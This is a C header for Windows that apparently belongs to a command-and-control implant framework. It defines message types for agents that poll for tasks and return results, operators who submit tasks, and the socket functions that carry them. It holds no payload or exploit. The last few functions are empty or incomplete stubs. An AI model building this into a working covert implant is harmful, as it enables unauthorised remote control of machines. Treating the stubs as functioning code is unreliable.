#pragma once
#include <WinSock2.h>
#include <Windows.h>

#include "debug.h"
#include "error.h"

#define TLV_HEADER_SIZE 8
#define MAX_MESSAGE_SIZE 65536

#define MSG_AGENT_GET_TASK 0x10000001
#define MSG_AGENT_POST_RESULT 0x10000002
#define MSG_OPERATOR_SUBMIT_TASK 0x10000003
#define MSG_OPERATOR_GET_RESULT 0x10000004
#define MSG_SERVER_NO_TASK 0x10000005
#define MSG_SERVER_TASK 0x10000006
#define MSG_SERVER_ACK 0x10000007
#define MSG_SERVER_RESULT 0x10000008
#define MSG_SERVER_PENDING 0x10000009

#define DEFAULT_AGENT_ID 1
#define DEFAULT_POLL_INTERVAL_MS 5000

typedef struct _TLV_MESSAGE
{
	DWORD type;
	DWORD length;
	PBYTE value;
} TLV_MESSAGE;

typedef struct _AGENT_GET_TASK_REQUEST
{
	DWORD agentId;
} AGENT_GET_TASK_REQUEST;

typedef struct _TASK_HEADER
{
	DWORD taskId;
	DWORD commandId;
	DWORD argLength;
} TASK_HEADER;

typedef struct _TASK_RESULT_HEADER
{
	DWORD agentId;
	DWORD taskId;
	DWORD commandId;
	DWORD status;
	DWORD resultLength;
} TASK_RESULT_HEADER;

/**
 * @brief Sends a raw TLV message using the shared wire format.
 *
 * @param sock The active C2 socket used to send the message.
 * @param type The TLV message type.
 * @param payloadLength The number of payload bytes to send.
 * @param payload The optional payload buffer.
 *
 * @return TRUE on success, or FALSE if the send fails.
 */
BOOL SendTlvMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE payload);

/**
 * @brief Receives a full TLV message from the active socket.
 *
 * On success, the payload buffer is heap allocated and must later be freed by
 * calling FreeTlvMessage.
 *
 * @param sock The active C2 socket to read from.
 * @param msg Receives the decoded TLV message.
 *
 * @return TRUE on success, or FALSE if the receive fails or the message is invalid.
 */
BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg);

/**
 * @brief Frees the heap-owned payload buffer inside a TLV message.
 *
 * @param msg The TLV message whose payload buffer should be released.
 *
 * @return VOID
 */
VOID FreeTlvMessage(TLV_MESSAGE* msg);

BOOL DecryptTLSMessage( ) {}
BOOL EncryptTLSMessage() {}

BOOL SendHttpMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE payload)
{
	return 0;
}

VOID FreeHttpMessage(TLV_MESSAGE* msg);